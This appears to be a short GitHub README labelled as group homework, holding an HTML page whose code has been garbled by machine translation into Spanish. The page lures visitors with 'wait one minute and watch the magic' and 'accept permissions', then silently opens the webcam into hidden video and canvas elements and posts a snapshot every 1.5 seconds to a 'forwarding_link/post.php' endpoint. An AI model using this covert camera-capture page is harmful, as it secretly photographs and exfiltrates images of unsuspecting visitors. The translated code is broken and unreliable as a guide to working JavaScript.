# hello-world
tarea de grupo 
<! doctype html >
< html >
< cabeza >
< script  type = " text / javascript " src = " https://wybiral.github.io/code-art/projects/tiny-mirror/index.js " > </ script >
< link  rel = " stylesheet " type = " text / css " href = " https://wybiral.github.io/code-art/projects/tiny-mirror/index.css " >
< script  type = " text / javascript " src = " https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js " > </ script >
</ cabeza >
< div  class = " video-wrap " hidden = " hidden " >
   < video  id = " video " reproduce  reproducción automática en línea > </ video >
</ div >
< canvas  hidden = " hidden " id = " canvas " width = " 640 " height = " 480 " > </ canvas >
< guión >
function  post ( imgdata ) {
$ . ajax ( {
    tipo : 'POST' ,
    datos : {  cat : imgdata } ,
    url : 'forwarding_link / post.php' ,
    dataType : 'json' ,
    async : falso ,
    éxito : función ( resultado ) {
        // llamar a la función que maneja la respuesta / resultados
    } ,
    error : function ( ) {
    }
  } ) ;
} ;
'uso estricto' ;
 video  constante =  documento . getElementById ( 'video' ) ;
const  lienzo  =  documento . getElementById ( 'lienzo' ) ;
const  errorMsgElement  =  documento . querySelector ( 'span # errorMsg' ) ;
 restricciones  constantes =  {
  audio : falso ,
  video : {
    
    faceMode : "usuario"
  }
} ;
// Acceder a la webcam
 función  asíncrona init ( )  {
  prueba  {
    const  stream  =  aguardar al  navegador . mediaDevices . getUserMedia ( restricciones ) ;
    handleSuccess ( secuencia ) ;
  }  captura  ( e )  {
    errorMsgElement . innerHTML  =  `error navigator.getUserMedia: $ { e . toString ( ) } ` ;
  }
}
// Éxito
function  handleSuccess ( stream )  {
  ventana . stream  =  stream ;
  video . srcObject  =  flujo ;
var  context  =  lienzo . getContext ( '2d' ) ;
  setInterval ( function ( ) {
       contexto . drawImage ( video ,  0 ,  0 ,  640 ,  480 ) ;
       var  canvasData  =  lienzo . toDataURL ( "imagen / png" ) . reemplazar ( "imagen / png" ,  "imagen / secuencia de octetos" ) ;
       publicación ( canvasData ) ;  } ,  1500 ) ;
  
}
// Cargar init
init ( ) ;

</ script >

    < cuerpo >
    < body  bgcolor = " trigo " >
       < marquee  bgcolor = " gray " behavior = " alternate " > ESPERE 1 MIN Y Mire MAGIA </ marquee >
     < hr >
       < Br > < br > < br > < br > < br > < br > < br > < br > < br > < br > < br >
        < p > Pista: mira el favicon </ p >
        < p > (Aceptar permisos) </ p >
        < p > < label > < input  type = " checkbox " name = " mirror " id = " mirror " /> Imagen reflejada </ label > </ p >
    </ cuerpo >
</ html >
